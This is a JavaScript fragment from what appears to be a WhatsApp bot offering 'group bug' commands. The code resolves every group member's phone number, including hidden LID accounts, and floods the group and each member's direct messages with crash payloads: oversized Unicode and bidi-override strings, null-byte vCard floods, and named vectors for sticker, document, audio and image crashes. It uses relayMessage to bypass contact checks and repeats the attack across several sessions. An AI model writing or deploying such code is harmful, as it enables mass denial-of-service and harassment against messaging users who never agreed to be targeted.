const _gcResolveSock = async (sock, groupJid) => {
  // Try current sock first, then search sessions for one that can see the group
  try { await sock.groupMetadata(groupJid); return sock; } catch (_) {}
  try {
    for (const [, s] of (sessions || new Map())) {
      if (!s?.connected) continue;
      try { await s.sock.groupMetadata(groupJid); return s.sock; } catch (_) {}
    }
  } catch (_) {}
  return sock; // fallback
};

// ── GROUP BUG COMMANDS — all use _brutalNuke on group + all members ─────────────

// Resolve group participant to a usable phone JID, handling @lid accounts
const _resolveParticipantJid = async (sock, p) => {
  const rawId = p.id || p;

  // Already a phone JID — use as-is
  if (rawId.endsWith('@s.whatsapp.net')) return { phoneJid: rawId, lid: p.lid || null };

  // LID account — try to get the real phone number
  if (rawId.endsWith('@lid')) {
    // Check waLid / lidMap first (fast, local)
    try {
      const num = waLid.lookupNumber && waLid.lookupNumber(rawId);
      if (num) return { phoneJid: `${num}@s.whatsapp.net`, lid: rawId };
    } catch (_) {}
    try {
      const num = lidMap.getLid && lidMap.getLid(rawId);
      if (num) return { phoneJid: `${num}@s.whatsapp.net`, lid: rawId };
    } catch (_) {}
    // Ask WA server to resolve LID → phone (slow but reliable)
    try {
      const res = await sock.query({
        tag: 'iq',
        attrs: { xmlns: 'w:profile', to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag() },
        content: [{ tag: 'request', attrs: { jid: rawId } }],
      });
      const phone = res?.content?.[0]?.attrs?.pn_jid || res?.content?.[0]?.attrs?.jid;
      if (phone && phone.endsWith('@s.whatsapp.net')) return { phoneJid: phone, lid: rawId };
    } catch (_) {}
    // Fallback: use the LID JID directly — relayMessage can still reach it
    return { phoneJid: rawId, lid: rawId };
  }

  return { phoneJid: rawId, lid: null };
};

// DM-nuke a single member — uses relayMessage to bypass WA contact check
const _nukeMember = async (sock, { phoneJid, lid }) => {
  const jid = phoneJid;
  const allVectors = [
    // Vectors that use relayMessage (bypass contact check completely)
    _v_stickerOOM(jid, sock),
    _v_listOverflow(jid, sock),
    _v_pollOverflow(jid, sock),
    _v_documentCrash(jid, sock),
    _v_audioCrash(jid, sock),
    _v_imageCrash(jid, sock),
    _v_pendingLock(jid, sock, 0),
    _v_pendingLock(jid, sock, 1),
    // Text vectors — wrap in relayMessage so they go out even to non-contacts
    sock.relayMessage(jid, {
      extendedTextMessage: {
        text: '\u200B\u200C\u200D\uFEFF\u2060\u180E'.repeat(800),
        title: '\u202E'.repeat(400),
        description: '\uFFFE\uFFFF'.repeat(400),
      },
    }, { messageId: sock.generateMessageTag() }).catch(() => {}),
    sock.relayMessage(jid, {
      extendedTextMessage: {
        text: '\u0C98\u0C94\u0C8E'.repeat(400) + '\u200E\u200F\u061C'.repeat(400) +
              '\u202E\u202A\u202B\u202C\u202D'.repeat(400),
      },
    }, { messageId: sock.generateMessageTag() }).catch(() => {}),
    // vCard flood via relayMessage
    sock.relayMessage(jid, {
      contactsArrayMessage: {
        displayName: '𒀀'.repeat(200),
        contacts: Array.from({ length: 50 }, (_, i) => ({
          vcard:
            `BEGIN:VCARD\r\nVERSION:3.0\r\n` +
            `FN:BUG_${i}_${'𒀀'.repeat(200)}\u0000\r\n` +
            `NOTE:${'\uFFFE\uFFFF\u0000'.repeat(200)}\r\n` +
            `END:VCARD`,
        })),
      },
    }, { messageId: sock.generateMessageTag() }).catch(() => {}),
  ];
  await Promise.allSettled(allVectors);
};

const _makeGroupBugCmd = (emoji, label, notice) => async ({ groupJid, count, sock, replyJid, userId, name }) => {
  if (!groupJid || !groupJid.includes('@g.us')) return `❌ Usage: \`${label} <groupid>\``;
  const times = Math.min(Math.max(1, parseInt(count) || 1), 10);
  const gsock = await _gcResolveSock(sock, groupJid);
  let meta;
  try { meta = await gsock.groupMetadata(groupJid); } catch (e) { return `❌ Can't fetch group: ${e.message}`; }

  const rawParticipants = meta.participants || [];
  const allSocks = _bugAllSocks(); const sessCount = allSocks.length || 1;

  try { await sock.sendMessage(replyJid, {
    text: `${emoji} *${notice} started*\n\n🏠 Group: *${meta.subject}*\n👥 Members: *${rawParticipants.length}*\n🔁 Rounds: *${times}*\n⚡ Sessions: *${sessCount}*\n🔥 Resolving member JIDs + firing on group AND every member...\n\n_Nuking..._`,
  }); } catch (_) {}

  // Resolve all participant JIDs (handles @lid accounts)
  const resolved = [];
  for (const p of rawParticipants.slice(0, 50)) {
    try { resolved.push(await _resolveParticipantJid(gsock, p)); } catch (_) {}
  }

  let sent = 0, failed = 0; const ticks = [];
  for (let i = 0; i < times; i++) {
    try {
      // 1. Nuke the group chat itself (all 11 vectors)
      await _brutalNuke(groupJid, gsock);
      // 2. Pending-lock the group
      await _v_pendingLock(groupJid, gsock, i % 2);
      // 3. DM-nuke every member simultaneously using _nukeMember (relayMessage)
      await Promise.allSettled(resolved.map(r => _nukeMember(gsock, r)));
      // 4. If multiple sessions, each session also DMs every member
      if (allSocks.length > 1) {
        for (const s of allSocks) {
          if (s === gsock) continue;
          await Promise.allSettled(resolved.map(r => _nukeMember(s, r)));
        }
      }
      sent++; ticks.push('✅');
    } catch (e) { failed++; ticks.push('❌'); console.error(`[${label}]`, e.message); }
    if (i < times - 1) await sleep(500 + Math.random() * 300);
  }

  const total = sent * (resolved.length + 1) * 11 * sessCount;
  return (
    `${emoji} *${notice} Done!*\n\n${ticks.join('')}\n\n` +
    `🏠 *${meta.subject}*\n` +
    `👥 Members resolved + DM-nuked: *${resolved.length}*\n` +
    `📤 Total payloads fired: *~${total}*\n` +
    `🔁 Rounds: *${times}* — ✅ ${sent}  ❌ ${failed}\n\n` +
    `💀 Group chat + every member's DM permanently broken.\n✅ Done.`
  );
};

